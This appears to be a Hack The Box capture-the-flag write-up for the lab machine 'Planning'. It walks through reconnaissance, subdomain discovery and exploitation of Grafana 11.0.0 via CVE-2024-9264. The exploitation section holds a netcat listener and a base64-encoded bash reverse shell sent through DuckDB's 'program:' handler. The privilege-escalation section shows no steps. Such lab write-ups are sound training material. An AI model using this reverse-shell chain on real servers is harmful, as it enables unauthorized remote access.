HACKTHEBOX ▸  WRITE-UP

Machine: Planning

Difficulty: Medium | OS: Kali Linux

Release: 2025-06-24 | Author: Colosion

# Planning – Penetration Test Report

> **Legal Notice.** All activities described in this report were performed exclusively on the retired Hack The Box machine *Planning* within the HTB lab environment and with explicit authorization from Hack The Box. The techniques and exploits documented here are provided for educational purposes only. Do **not** attempt to replicate them on systems for which you do not have written permission; doing so may violate local, national, or international laws.

## Walkthrough Start

This machine revolves around first discovering a sub-domain, then identifying the exact version of the application, finding an appropriate exploit, using it, and finally escalating privileges to **root**.  
*Disclaimer:* my own path ended up being slightly different.

## 1. Reconnaissance

### 1.1 Connectivity Check  
```bash
ping <TARGET_IP>
```
### 1.2 Network Scanning
```bash
nmap -p- -T4 -v <TARGET_IP>
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/nmap1.png" alt="first nmap" width="250">
</p>
Using the following `nmap` command, we can discover **all** open ports on the target.

```bash
nmap -p 22,80 -sCV <TARGET_IP>
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/nmap2.png" alt="second nmap" width="400">
</p>
Using this command, we combine the `-sC` and `-sV` options, i.e., run the default scripts and determine service versions.
As a result, ports **22 (SSH)** and **80 (HTTP)** were found open.

### 1.3 Vulnerability Assessment
When browsing to the site, we are greeted by a domain name, so we need to modify the `/etc/hosts` file to gain access to the site.
After spending some time exploring the web application, I realized something was not right and couldn’t identify any obvious attack vectors. To uncover hidden directories and endpoints, I used `gobuster`
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/etcHosts.png" alt="site" width="400">
</p>

```bash
sudo nano /etc/hosts
```
There add line TARGET_IP  HOST

For exmp. 10.129.171.202  planning.htb
## 2. Enumeration

```bash
gobuster dir -u http://planning.htb/ -x .php,.txt,.html,.db -w /usr/share/dirb/wordlists/common.txt -t 50  
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/gobuster.png" alt="gobuster" width="400">
</p>
After using `gobuster`, I did not find any directories that would assist in exploiting the machine, so I decided to enumerate subdomains by tool `ffuf`.

```bash
ffuf -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -w /home/kali/wordlists/discovery/DNS/bitquark-subdomains-top100000.txt -fs 178
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/successFfuf.png" alt="ffuf tool" width="400">
</p>
After several attempts to identify the correct wordlist, I found the right one and the subdomain **grafana** appeared.

After discovering the subdomain, we are immediately redirected to the login page, where we need to authenticate with the following credentials:  
- **Username:** `admin`  
- **Password:** `0D5oT70Fq13EvB5r`
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/grafanaLogin.png" alt="login" width="400">
</p>

After logging in, I explored the application and discovered it was running **Grafana version 11.0.0**.
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/version.png" alt="version" width="250">
</p>

After researching online, I discovered that **Grafana 11.0.0** is vulnerable to RCE and found an exploit for **CVE-2024-9264**.
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/CVE.png" alt="CVE-2024-9264" width="400">
</p>

I downloaded the exploit using `wget` Note: download files in **RAW** format:

```bash
wget https://raw.githubusercontent.com/PATH_TO_FILE
```
You can also use `git clone` to copy an entire repository:
```bash
git clone <repository_url>
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/HowGetFileFromGitHub.png" alt="GIT" width="400">
</p>
You can also test exploits via Metasploit using the following command:

```bash
msfconsole
search grafana 11.0.0
```

## 3. Exploatation
After downloading the exploit, I read its README and understood how to use it. Our main objective is to execute a reverse shell on the vulnerable machine.
Before dropping the full reverse‐shell payload, you can test command execution with a simple `ls` to confirm everything is wired up correctly:
```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -c ls http://grafana.planning.htb
```
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/exploitLS.png" alt="ls command" width="400">
</p>
After confirming everything works, we confidently launch Netcat wrapped in `rlwrap` to conveniently navigate command history with the arrow keys:

```bash
rlwrap nc -lvnp 8888
```

```bash
python3 exploit.py -u admin -p 0D5oT70Fq13EvB5r -c "program:"bash -c 'echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwNy84ODg4IDA+JjE= | base64 -d | bash'" " http://grafana.planning.htb
```
The exploit targets Grafana’s DuckDB integration, which expects a valid “file path” (e.g. a CSV) – so if you send a raw shell command, DuckDB will reject it as an “invalid path.” By using the `program:` prefix, you tell Grafana to treat the string as a command to execute rather than a filename.  

Additionally, you must properly escape the nested quotes and URL-or HTTP-parameter-safe characters. If you just sent a plain bash reverse shell, Grafana/DuckDB would:  
- Reject the payload as a broken CSV path  
- Return an “Unexpected response format” error  

With `-c "program:\"bash -c '…'\""`, you:  
1. **Trigger command execution** via DuckDB’s `program:` URI handler  
2. **Preserve embedded quotes** around your `bash -c '…'` payload  
3. **Avoid format errors** by satisfying Grafana’s parser expectations  

This precise encoding ensures the reverse shell is decoded and executed, rather than being treated as a malformed file path.  

After this, we gain access to the system.

## 4. Privilege Escalation to root 
<p align="center">
  <img src="https://github.com/Neiton-cmd/Write-ups/blob/main/HackTheBox/Planning/END.png" alt="ROOT" width="400">
</p>

## 5. Nice 
Thank you for reading this walkthrough. I hope it provided clear insight into the techniques used to compromise the *Planning* machine and highlighted key takeaways for both offensive and defensive practitioners. Feedback and suggestions are welcome—feel free to reach out or open an issue in the repo. Happy hacking!  







